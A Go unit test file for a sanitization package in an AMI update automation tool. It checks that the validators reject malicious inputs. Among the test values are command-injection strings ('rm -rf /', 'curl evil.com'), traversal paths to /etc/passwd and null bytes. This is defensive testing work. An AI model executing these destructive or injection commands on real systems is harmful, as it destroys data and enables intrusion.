package sanitize_test

import (
	"strings"
	"testing"

	"github.com/kaiohenricunha/ami-update-automation/internal/sanitize"
	"github.com/kaiohenricunha/ami-update-automation/pkg/types"
	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

func TestValidateK8sVersion(t *testing.T) {
	tests := []struct {
		name    string
		input   string
		wantErr bool
	}{
		{"valid 1.29", "1.29", false},
		{"valid 1.30", "1.30", false},
		{"empty", "", true},
		{"too long", strings.Repeat("1", 20), true},
		{"with patch", "1.29.0", true},
		{"letters", "abc", true},
		{"injection", "1.29; rm -rf /", true},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			err := sanitize.ValidateK8sVersion(tc.input)
			if tc.wantErr {
				require.Error(t, err)
				assert.ErrorIs(t, err, types.ErrInputValidation)
			} else {
				require.NoError(t, err)
			}
		})
	}
}

func TestValidateAMIVersion(t *testing.T) {
	tests := []struct {
		name    string
		input   string
		wantErr bool
	}{
		{"valid", "1.29.3-20240531", false},
		{"valid with build", "1.29.3-20240531-1234", false},
		{"empty", "", true},
		{"shell injection", `1.29.0"; curl evil.com`, true},
		{"null byte", "1.29.0\x00evil", true},
		{"space", "1.29.0 evil", true},
		{"pipe", "1.29.0|evil", true},
		{"too long", strings.Repeat("a", 65), true},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			err := sanitize.ValidateAMIVersion(tc.input)
			if tc.wantErr {
				require.Error(t, err)
			} else {
				require.NoError(t, err)
			}
		})
	}
}

func TestValidateOwner(t *testing.T) {
	assert.NoError(t, sanitize.ValidateOwner("kaiohenricunha"))
	assert.NoError(t, sanitize.ValidateOwner("my-org"))
	assert.Error(t, sanitize.ValidateOwner(""))
	assert.Error(t, sanitize.ValidateOwner("bad owner!"))
	assert.Error(t, sanitize.ValidateOwner("../../../etc"))
	assert.Error(t, sanitize.ValidateOwner(strings.Repeat("a", 300)))
}

func TestValidateRepoName(t *testing.T) {
	assert.NoError(t, sanitize.ValidateRepoName("cloud-infra-prod"))
	assert.NoError(t, sanitize.ValidateRepoName("repo_123"))
	assert.Error(t, sanitize.ValidateRepoName(""))
	assert.Error(t, sanitize.ValidateRepoName("repo; rm -rf /"))
	assert.Error(t, sanitize.ValidateRepoName("repo\x00name"))
}

func TestValidateBranchName(t *testing.T) {
	assert.NoError(t, sanitize.ValidateBranchName("ami-update/1.29"))
	assert.NoError(t, sanitize.ValidateBranchName("feature/my-branch"))
	assert.Error(t, sanitize.ValidateBranchName(""))
	assert.Error(t, sanitize.ValidateBranchName("branch\x00name"))
	assert.Error(t, sanitize.ValidateBranchName("branch name"))
}

func TestValidatePath(t *testing.T) {
	t.Run("valid relative path", func(t *testing.T) {
		err := sanitize.ValidatePath("/repo", "infra/main.tf")
		require.NoError(t, err)
	})
	t.Run("traversal attack", func(t *testing.T) {
		err := sanitize.ValidatePath("/repo", "../../etc/passwd")
		require.Error(t, err)
		assert.ErrorIs(t, err, types.ErrInputValidation)
	})
	t.Run("absolute path", func(t *testing.T) {
		err := sanitize.ValidatePath("/repo", "/etc/passwd")
		require.Error(t, err)
	})
	t.Run("null byte", func(t *testing.T) {
		err := sanitize.ValidatePath("/repo", "file\x00.tf")
		require.Error(t, err)
	})
}

func TestSanitizePRContent(t *testing.T) {
	input := "Update AMI\x01\x02 version\x00 to 1.29"
	result := sanitize.SanitizePRContent(input, 1000)
	assert.NotContains(t, result, "\x01")
	assert.NotContains(t, result, "\x02")
	assert.NotContains(t, result, "\x00")
	assert.Contains(t, result, "Update AMI")

	long := strings.Repeat("a", 200)
	short := sanitize.SanitizePRContent(long, 100)
	assert.Equal(t, 100, len(short))
}

func TestRedactToken(t *testing.T) {
	token := "ghp_supersecret123"
	msg := "error cloning with token ghp_supersecret123: connection refused"
	redacted := sanitize.RedactToken(msg, token)
	assert.NotContains(t, redacted, token)
	assert.Contains(t, redacted, "[REDACTED]")
}
